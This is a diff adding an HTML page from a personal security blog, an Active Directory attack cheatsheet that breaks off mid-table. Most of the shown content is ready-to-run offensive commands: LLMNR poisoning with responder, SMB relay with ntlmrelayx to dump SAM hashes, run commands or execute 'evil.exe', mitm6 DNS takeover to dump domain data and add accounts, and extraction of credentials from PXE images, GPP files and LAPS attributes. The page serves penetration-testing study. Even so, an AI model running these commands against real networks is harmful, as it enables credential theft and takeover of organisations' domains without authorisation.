@@ -1,0 +1,694 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Initial Attack Vectors LLMNR/NBT-NS Poisoning Setup various services listeners an respond with spoofed responses in order to perform poisoning: responder -I &lt;interface&gt; -dw SMB Relay 1 - Maps the network of live hosts and saves a list of only the hosts that don&#39;t require SMB signing: nxc smb &lt;target network …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="Active Directory Cheatsheet"/>
+  <meta property="og:description" content="Initial Attack Vectors LLMNR/NBT-NS Poisoning Setup various services listeners an respond with spoofed responses in order to perform poisoning: responder -I &lt;interface&gt; -dw SMB Relay 1 - Maps the network of live hosts and saves a list of only the hosts that don&#39;t require SMB signing: nxc smb &lt;target network …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="1957-01-01 00:00:00+01:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
+  <meta property="article:section" content="Cheatsheet"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; Active Directory Cheatsheet</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="https://ojack69.github.io/jacks-corner/">
+      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+      <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick="loadStorkIndex()"/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="https://ojack69.github.io/jacks-corner/">Home</a>
+
+  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
+  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
+  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="ad/cheatsheet">Active Directory Cheatsheet</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#initial-attack-vectors" title="Initial Attack Vectors">Initial Attack Vectors</a><ul><li><a class="toc-href" href="#llmnrnbt-ns-poisoning" title="LLMNR/NBT-NS Poisoning">LLMNR/NBT-NS Poisoning</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#pxe-boot-image-retrieval" title="PXE Boot Image Retrieval">PXE Boot Image Retrieval</a></li><li><a class="toc-href" href="#crack-gpp" title="Crack GPP">Crack GPP</a></li><li><a class="toc-href" href="#workstation-takeover-with-laps" title="Workstation takeover with LAPS">Workstation takeover with LAPS</a></li><li><a class="toc-href" href="#ldap-pass-back" title="LDAP Pass-back">LDAP Pass-back</a></li></ul></li><li><a class="toc-href" href="#enumeration_1" title="Enumeration">Enumeration</a><ul><li><a class="toc-href" href="#command-line-enumeration" title="Command Line Enumeration">Command Line Enumeration</a></li><li><a class="toc-href" href="#powershell-enumeration" title="Powershell Enumeration">Powershell Enumeration</a><ul><li><a class="toc-href" href="#using-net-classes" title="Using .NET classes">Using .NET classes</a></li><li><a class="toc-href" href="#wmi-enumeration" title="WMI Enumeration">WMI Enumeration</a></li></ul></li><li><a class="toc-href" href="#sharphound_1" title="Sharphound">Sharphound</a></li></ul></li><li><a class="toc-href" href="#lateral-movements_1" title="Lateral Movements">Lateral Movements</a><ul><li><a class="toc-href" href="#dumping-credentials" title="Dumping Credentials">Dumping Credentials</a></li><li><a class="toc-href" href="#pass-the-password-pass-the-hash" title="Pass-the-password &amp; Pass-the-hash">Pass-the-password &amp; Pass-the-hash</a></li><li><a class="toc-href" href="#token-impersonation" title="Token Impersonation">Token Impersonation</a><ul><li><a class="toc-href" href="#token-impersonation-metasploit" title="Token Impersonation: Metasploit">Token Impersonation: Metasploit</a></li><li><a class="toc-href" href="#token-impersonation-mimikatz" title="Token Impersonation: Mimikatz">Token Impersonation: Mimikatz</a></li></ul></li><li><a class="toc-href" href="#kerberoasting_1" title="Kerberoasting">Kerberoasting</a></li></ul></li><li><a class="toc-href" href="#persistence_1" title="Persistence">Persistence</a><ul><li><a class="toc-href" href="#golden-silver-tickets" title="Golden &amp; Silver Tickets">Golden &amp; Silver Tickets</a></li></ul></li><li><a class="toc-href" href="#kerberos_1" title="Kerberos">Kerberos</a></li><li><a class="toc-href" href="#misc" title="Misc">Misc</a></li></ul></div>
+        </div>
+    <h2 id="initial-attack-vectors">Initial Attack Vectors</h2>
+<h3 id="llmnrnbt-ns-poisoning">LLMNR/NBT-NS Poisoning</h3>
+<p>Setup various services listeners an respond with spoofed responses in order to perform poisoning:</p>
+<div class="highlight"><pre><span></span><code>responder<span class="w"> </span>-I<span class="w"> </span>&lt;interface&gt;<span class="w"> </span>-dw<span class="w"> </span>
+</code></pre></div>
+<h3 id="smb-relay">SMB Relay</h3>
+<p>1 - Maps the network of live hosts and saves a list of only the hosts that don't require SMB signing:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>network/ip&gt;<span class="w"> </span>--gen-relay-list<span class="w"> </span>relay_list.txt
+<span class="c1"># OR</span>
+nmap<span class="w"> </span>--script<span class="o">=</span>smb2-security-mode.nse<span class="w"> </span>-p445<span class="w"> </span>&lt;target<span class="w"> </span>network/ip&gt;
+</code></pre></div>
+<p>2 - Disable listening for SMB and HTTP protocols in the <code>responder</code>  by modifying <code>responder</code> config file, setting the protocols entries to <code>Off</code>:</p>
+<div class="highlight"><pre><span></span><code>vim<span class="w"> </span>/usr/share/responder/Responder.conf
+responder<span class="w"> </span>-I<span class="w"> </span>&lt;interface&gt;<span class="w"> </span>-dw<span class="w"> </span>
+</code></pre></div>
+<p>3 - Use <code>impacket</code>'s ntlmrelayx.py script:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Dumps local SAM hashes</span>
+ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>relay_list.txt<span class="w"> </span>-smb2support
+
+<span class="c1"># Run with interactive mode (then connect with netcat to listening port)</span>
+ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>relay_list.txt<span class="w"> </span>-smb2support<span class="w"> </span>-i
+
+<span class="c1"># Run commands</span>
+ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-c<span class="w"> </span><span class="s2">"whoami"</span>
+
+<span class="c1"># Run executable</span>
+ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-e<span class="w"> </span>evil.exe
+</code></pre></div>
+<h3 id="dns-takeover-via-ipv6">DNS takeover via IPv6</h3>
+<p>Start <code>mitm6</code> to respond with spoofed IPv6 DNS responses:</p>
+<div class="highlight"><pre><span></span><code>mitm6<span class="w"> </span>-d<span class="w"> </span>&lt;target<span class="w"> </span>domain&gt;
+</code></pre></div>
+<p>Then relay captured hashes with <code>ntlmrelayx.py</code> (should wait till some DNS events happen):</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Perform a SMB relay attack</span>
+ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-wh<span class="w"> </span>&lt;attacker<span class="w"> </span>wpad<span class="w"> </span>spoofed<span class="w"> </span>domain&gt;<span class="w"> </span>-t<span class="w"> </span>smb://&lt;target&gt;<span class="w"> </span>-smb2support<span class="w"> </span>
+
+<span class="c1"># Abuse WPAD to dump useful information and create a new persisten account on the DC (an administrator should perform a login while listening)</span>
+
+<span class="c1"># Using SMB (if enabled on the DC)</span>
+ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-t<span class="w"> </span>&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>-wh<span class="w"> </span>&lt;attacker<span class="w"> </span>wpad<span class="w"> </span>spoofed<span class="w"> </span>domain&gt;<span class="w"> </span>-l<span class="w"> </span>lootdump<span class="w"> </span>-smb2support
+
+<span class="c1"># Using LDAP (if enabled on the DC)</span>
+ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-t<span class="w"> </span>ldap://&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>-wh<span class="w"> </span>&lt;attacker<span class="w"> </span>wpad<span class="w"> </span>spoofed<span class="w"> </span>domain&gt;<span class="w"> </span>-l<span class="w"> </span>lootdump
+</code></pre></div>
+<p>Interesting resources:</p>
+<ul>
+<li><a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation">NTLM Relaying and Kerberos Delegation</a></li>
+<li><a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">mimtm6 - Compromising ipv4 network via ipv6</a></li>
+</ul>
+<h3 id="pxe-boot-image-retrieval">PXE Boot Image Retrieval</h3>
+<p>0 - Request an IP to the DHCP, retrieve BCD file path, retrieve WIM File path and extract  credentials with <code>PowerPXE</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerPXE</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Get-PXEcreds</span> <span class="n">-InterfaceAlias</span> <span class="p">&lt;</span><span class="n">interface</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Or manually (requires the BCD file path to be known):</p>
+<p>1 - Retrieve BCD file with the TFTP client:</p>
+<div class="highlight"><pre><span></span><code>tftp<span class="w"> </span>-i<span class="w"> </span>&lt;MDT<span class="w"> </span>Server<span class="w"> </span>IP&gt;<span class="w"> </span>GET<span class="w"> </span><span class="s2">"\Tmp\&lt;bcd file&gt;.bcd"</span><span class="w"> </span>conf.bcd
+</code></pre></div>
+<p>2 - Use <code>PowerPXE</code> to extract the WIM File path (the <strong>PXE Boot Image Location</strong>):</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerPXE</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nv">$BCDFile</span> <span class="p">=</span> <span class="s2">"conf.bcd"</span>
+<span class="nb">Get-WimFile</span> <span class="n">-bcdFile</span> <span class="nv">$BCDFile</span>
+<span class="p">...</span>
+<span class="p">&gt;&gt;</span> <span class="n">Parse</span> <span class="n">the</span> <span class="n">BCD</span> <span class="n">file</span><span class="p">:</span> <span class="n">conf</span><span class="p">.</span><span class="n">bcd</span>
+<span class="p">&gt;&gt;&gt;&gt;</span> <span class="n">Identify</span> <span class="n">wim</span> <span class="n">file</span> <span class="p">:</span> <span class="p">&lt;</span><span class="n">PXE</span> <span class="n">Boot</span> <span class="n">Image</span> <span class="n">Location</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="n">PXE</span> <span class="n">Boot</span> <span class="n">Image</span> <span class="n">Location</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>3 - Retrieve the WIM File with the TFTP client:</p>
+<div class="highlight"><pre><span></span><code>tftp<span class="w"> </span>-i<span class="w"> </span>&lt;MDT<span class="w"> </span>Server<span class="w"> </span>IP&gt;<span class="w"> </span>GET<span class="w"> </span><span class="s2">"&lt;PXE Boot Image Location&gt;"</span><span class="w"> </span>pxeboot.wim
+</code></pre></div>
+<p>4 - Use <code>PowerPXE</code> to extract the credentials stored within the WIMFile:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-FindCredentials</span> <span class="n">-WimFile</span> <span class="n">pxeboot</span><span class="p">.</span><span class="n">wim</span>
+</code></pre></div>
+<p>Useful Resources:</p>
+<ul>
+<li><a href="https://github.com/wavestone-cdt/powerpxe">PowerPXE</a></li>
+<li><a href="https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/">Taking over Windows Workstations thanks to LAPS and PXE</a></li>
+</ul>
+<h3 id="crack-gpp">Crack GPP</h3>
+<p>If some GPP relevant file is obtained from SYSVOL, it's possible to crack every password entry with the following command:</p>
+<div class="highlight"><pre><span></span><code>gpp-decrypt<span class="w"> </span>&lt;cPassword&gt;
+</code></pre></div>
+<p>Moreover, the script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword</a> from PowerSploit exfiltrates and cracks GPP passwords:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-GPPPassword</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">passwords</span><span class="p">}</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">-Uniq</span>
+</code></pre></div>
+<p>Consider also trying Metasploit <code>auxiliary/scanner/smb/smb_enum_gpp</code> module.</p>
+<h3 id="workstation-takeover-with-laps">Workstation takeover with LAPS</h3>
+<p>Import <code>AdmPwd.PS</code> module, if not imported:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="n">AdmPwd</span><span class="p">.</span><span class="nb">PS</span>
+</code></pre></div>
+<p>Find groups with privileges to access the <code>ms-mcs-AdmPwd</code> attribute:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Find-AdmPwdExtendedRights</span>
+
+<span class="c">#or filter by OUs</span>
+
+<span class="nb">Find-AdmPwdExtendedRights</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">OU</span> <span class="n">or</span> <span class="p">*&gt;</span>
+</code></pre></div>
+<p>If any group is returned, check groups members:</p>
+<div class="highlight"><pre><span></span><code><span class="n">net</span> <span class="n">groups</span> <span class="s2">"&lt;found group&gt;"</span>
+</code></pre></div>
+<p>From a compromised user part of one of the previous groups, get the content of the<code>ms-mcs-AdmPwd</code> attribute:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-AdmPwdPassword</span> <span class="n">-Computer</span> <span class="n">Name</span> <span class="p">&lt;</span><span class="n">local</span> <span class="n">computer</span> <span class="n">name</span><span class="p">&gt;</span>
+
+<span class="c"># Or using PowerView</span>
+<span class="nb">Get-DomainComputer</span> <span class="p">&lt;</span><span class="n">Computer</span> <span class="n">Name</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="n">ms-mcs-AdmPwd</span><span class="p">,</span><span class="n">ComputerName</span><span class="p">,</span><span class="n">ms-mcs-AdmPwdExpirationTime</span>
+</code></pre></div>
+<p>Alternatively, check if any of the compromised accounts is the owner of the "computer" object in the AD (i.e. is the account used to join the computer to the domain) and therefore has the <code>ExtendedRights</code> privilege:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Import-module</span> <span class="n">ActiveDirectory</span>
+
+<span class="c">## Extract the default configuration for a "computer" object</span>
+<span class="nv">$computerobject</span> <span class="p">=</span> <span class="nb">Get-ADObject</span> <span class="n">-SearchBase</span> <span class="p">(</span><span class="nb">Get-ADRootDSE</span><span class="p">).</span><span class="n">SchemaNamingContext</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">Name</span> <span class="o">-eq</span> <span class="s2">"Computer"</span> <span class="p">}</span> <span class="n">-Properties</span> <span class="n">defaultSecurityDescriptor</span>
+
+<span class="c">## Create an object allowing managing the ACLs</span>
+<span class="nv">$sec</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">ActiveDirectorySecurity</span>
+
+<span class="nv">$sec</span><span class="p">.</span><span class="n">SetSecurityDescriptorSddlForm</span><span class="p">(</span><span class="nv">$computerobject</span><span class="p">.</span><span class="n">defaultSecurityDescriptor</span><span class="p">)</span>
+
+<span class="c">## List the privileges of the object owneer</span>
+
+<span class="nv">$acc</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">NTAccount</span><span class="p">(</span><span class="s2">"CREATOR OWNER"</span><span class="p">)</span> <span class="c">## Note: the principal name may be different if AD is installed with another language</span>
+
+<span class="nv">$sec</span><span class="p">.</span><span class="n">GetAccessRules</span><span class="p">(</span><span class="nv">$true</span><span class="p">,</span><span class="nv">$false</span><span class="p">,</span><span class="no">[System.Security.Principal.NTAccount]</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-eq</span> <span class="nv">$acc</span><span class="p">}</span>
+</code></pre></div>
+<p>If in the resulting info there's the <code>Extended Right</code> privilege corresponding to the <code>ActiveDirectoryRights</code> attribute, then the account can read the <code>ms-mcs-AdmPwd</code> attribute.</p>
+<p>Another useful tool is <a href="https://github.com/leoloobeek/LAPSToolkit">LAPS Toolkit</a>.</p>
+<p>References:</p>
+<ul>
+<li><a href="https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/">Taking over workstation thanks to LAPS</a></li>
+</ul>
+<h3 id="ldap-pass-back">LDAP Pass-back</h3>
+<p>This <a href="https://github.com/pedrojosenavasperez/ldap-passback-docker">LDAP server container</a> is configured to support plaintext authentication, easing to perform a LDAP Pass-back attack.</p>
+<h2 id="enumeration_1">Enumeration</h2>
+<p>Network Credentials Injection with <code>runas</code>:</p>
+<div class="highlight"><pre><span></span><code>runas.exe<span class="w"> </span>/netonly<span class="w"> </span>/user:&lt;domain&gt;<span class="se">\&lt;</span>username&gt;<span class="w"> </span>cmd.exe
+</code></pre></div>
+<p>Enumeration with the Microsoft Management Console (MMC):</p>
+<div class="highlight"><pre><span></span><code>mmc.exe<span class="w"> </span><span class="c1"># eventually run in previous runas cmd terminal</span>
+</code></pre></div>
+<h3 id="command-line-enumeration">Command Line Enumeration</h3>
+<p>List all registered SPNs in a DC:</p>
+<div class="highlight"><pre><span></span><code>setspn<span class="w"> </span>-T<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>-Q<span class="w"> </span>*/*
+</code></pre></div>
+<p>Enumerate all users in the AD:</p>
+<div class="highlight"><pre><span></span><code>net<span class="w"> </span>user<span class="w"> </span>/domain
+</code></pre></div>
+<p>Get details about a user in the AD:</p>
+<div class="highlight"><pre><span></span><code>net<span class="w"> </span>user<span class="w"> </span>&lt;user&gt;<span class="w"> </span>/domain
+</code></pre></div>
+<p>Enumerate all groups in the AD:</p>
+<div class="highlight"><pre><span></span><code>net<span class="w"> </span>group<span class="w"> </span>/domain
+</code></pre></div>
+<p>Get details about a group in the AD:</p>
+<div class="highlight"><pre><span></span><code>net<span class="w"> </span>group<span class="w"> </span>&lt;group&gt;<span class="w"> </span>/domain
+</code></pre></div>
+<p>Get details about domain password policy:</p>
+<div class="highlight"><pre><span></span><code>net<span class="w"> </span>accounts<span class="w"> </span>/domain
+</code></pre></div>
+<h3 id="powershell-enumeration">Powershell Enumeration</h3>
+<p>Enumerate SMB shares:</p>
+<div class="highlight"><pre><span></span><code>Get-SmbShare
+</code></pre></div>
+<p>Get domain information:</p>
+<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
+<span class="nb">Get-NetDomain</span> <span class="p">[</span><span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;]</span>
+
+<span class="c"># AD Module</span>
+<span class="nb">Get-ADDomain</span> <span class="p">[</span><span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;]</span>
+</code></pre></div>
+<p>Get domain SID:</p>
+<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
+<span class="nb">Get-DomainSID</span>
+
+<span class="c"># AD Module</span>
+<span class="p">(</span><span class="nb">Get-ADDomain</span><span class="p">).</span><span class="n">DomainSID</span>
+</code></pre></div>
+<p>Get a list of all operating systems on the domain (<code>PowerView</code>): </p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-NetComputer</span> <span class="n">-fulldata</span> <span class="p">|</span> <span class="nb">select </span><span class="n">operatingsystem</span>
+</code></pre></div>
+<p>Gets a list of all users on the domain (<code>PowerView</code>):</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-NetUser</span> <span class="p">|</span> <span class="nb">select </span><span class="n">cn</span>
+</code></pre></div>
+<p>Get details about a user in the AD:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-ADUser</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">-Server</span> <span class="p">&lt;</span><span class="n">DC</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="p">*</span>
+</code></pre></div>
+<p>Enumerate domain groups (<code>PowerView</code>):</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-NetGroup</span> <span class="n">-GroupName</span> <span class="p">*</span><span class="n">admin</span><span class="p">*</span>
+</code></pre></div>
+<p>Get domain policy (<code>PowerView</code>):</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-DomainPolicy</span> <span class="p">[</span><span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;]</span>
+<span class="p">(</span><span class="nb">Get-DomainPolicy</span><span class="p">).</span><span class="s2">"SystemAccess"</span>
+<span class="p">(</span><span class="nb">Get-DomainPolicy</span><span class="p">).</span><span class="s2">"KerberosPolicy"</span>
+</code></pre></div>
+<h4 id="using-net-classes">Using .NET classes</h4>
+<p>Use .NET classes to enumerate domains:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$ADClass</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span>
+<span class="nv">$ADClass</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">()</span>
+</code></pre></div>
+<p>References:</p>
+<ul>
+<li><a href="https://powersploit.readthedocs.io/en/latest/Recon/">PowerView Docs</a></li>
+</ul>
+<h4 id="wmi-enumeration">WMI Enumeration</h4>
+<p>Enumerate computers on which the current user has <em>local administrator</em> privileges:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$pcs</span> <span class="p">=</span> <span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_computer</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">ds_cn</span>
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$pc</span> <span class="k">in</span> <span class="nv">$pcs</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">(</span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_computersystem</span> <span class="n">-ComputerName</span> <span class="nv">$pc</span> <span class="n">-ErrorAction</span> <span class="n">silentlycontinue</span><span class="p">).</span><span class="n">name</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Finding the domain name:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_domain</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ds_dc</span><span class="p">,</span> <span class="n">ds_distinguishedname</span><span class="p">,</span> <span class="n">pscomputername</span>
+</code></pre></div>
+<p>Getting the domain policy:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_domain</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ds_lockoutduration</span><span class="p">,</span> <span class="n">ds_lockoutobservationwindow</span><span class="p">,</span> <span class="n">ds_lockoutthreshold</span><span class="p">,</span> <span class="n">ds_maxpwdage</span><span class="p">,</span> <span class="n">ds_minpwdage</span><span class="p">,</span> <span class="n">ds_minpwdlength</span><span class="p">,</span> <span class="n">ds_pwdhistorylength</span><span class="p">,</span> <span class="n">ds_pwdproperties</span>
+</code></pre></div>
+<p>*Note: All the timestamps in the above output are stored as negative &ldquo;filetimes&rdquo;, i.e. represented as negative integers of 100 nanosecond timeslices. </p>
+<ul>
+<li>Divide those values by <em>-600000000</em> to obtain the amount of minutes.</li>
+</ul>
+<p>Finding workstations and the domain controller:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_computer</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ds_useraccountcontrol</span> <span class="o">-match</span> <span class="p">&lt;</span><span class="n">user</span> <span class="nb">type </span><span class="n">constant</span><span class="p">&gt;</span>
+<span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ds_cn</span><span class="p">,</span> <span class="n">ds_dnshostname</span><span class="p">,</span> <span class="n">ds_operatingsystem</span><span class="p">,</span> <span class="n">ds_lastlogon</span><span class="p">,</span> <span class="n">ds_pwdlastset</span>
+</code></pre></div>
+<p>where <code>&lt;user type constant&gt;</code> is a User Account Control (UAC) constant mapped as follows:</p>
+<table>
+<thead>
+<tr>
+<th>User Type</th>
+<th>Hex Value</th>
+<th>Constants</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Normal User</td>
+<td>0x200</td>
+<td>512</td>
+</tr>
+<tr>
+<td>Workstation/Server</td>
+<td>0x1000</td>
+<td>4096</td>
+</tr>
+<tr>
+<td>Domain Controller</td>
+<td>0x82000</td>
+<td>532480</td>
+</tr>
+</tbody>
+</table>
+<p>Finding users:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_useraccount</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="n">accounttype</span>
+</code></pre></div>
+<p>It's possible to filter by <code>AccountType</code> property with the following contants:</p>
+<table>
+<thead>
+<tr>
+<th>Account Type</th>
+<th>Identifier</th>
+<th>Constant</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Temporary Duplicate Account</td>
